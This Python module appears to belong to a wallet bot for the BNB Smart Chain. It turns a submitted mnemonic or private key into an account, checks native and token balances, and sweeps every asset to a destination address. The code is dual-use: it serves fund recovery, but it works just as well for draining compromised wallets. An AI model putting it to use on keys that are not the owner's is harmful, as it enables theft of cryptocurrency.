from web3 import Web3
from eth_account import Account
from config import BSC_RPC_URL
from chains.tokens import BSC_TOKENS, get_token_balances
from chains.sweep_engine import smart_sweep_evm, BSC_RPCS

Account.enable_unaudited_hdwallet_features()

CHAIN_ID = 56
SYMBOL   = "BNB"

def _make_w3():
    return Web3(Web3.HTTPProvider(BSC_RPC_URL, request_kwargs={"timeout": 15}))

def get_account(secret: str):
    s = secret.strip()
    if len(s.split()) >= 12:
        return Account.from_mnemonic(s)
    return Account.from_key(s if s.startswith("0x") else "0x" + s)

def get_balance(address: str) -> float:
    for rpc in [BSC_RPC_URL] + BSC_RPCS:
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 10}))
            return float(Web3.from_wei(w3.eth.get_balance(Web3.to_checksum_address(address)), "ether"))
        except Exception:
            continue
    return 0.0

def get_all_balances(address: str) -> dict:
    """Return native + all token balances. Runs in parallel — fast."""
    balances = {}
    try:
        native = get_balance(address)
        if native > 0:
            balances["BNB"] = native
    except Exception:
        pass
    w3 = _make_w3()
    balances.update(get_token_balances(w3, address, BSC_TOKENS))
    return balances

def forward(secret: str, destination: str, user_id: int) -> list:
    try:
        account = get_account(secret)
    except Exception as e:
        return [{"chain": "bsc", "asset": "BNB", "status": "error",
                 "amount": 0, "tx_hash": None, "error": f"Key error: {e}"}]
    results = smart_sweep_evm(
        account=account, destination=destination,
        chain_id=CHAIN_ID, native_symbol=SYMBOL,
        token_map=BSC_TOKENS, rpc_pool=BSC_RPCS, config_rpc=BSC_RPC_URL,
    )
    return [{"chain": "bsc", **r} for r in results]
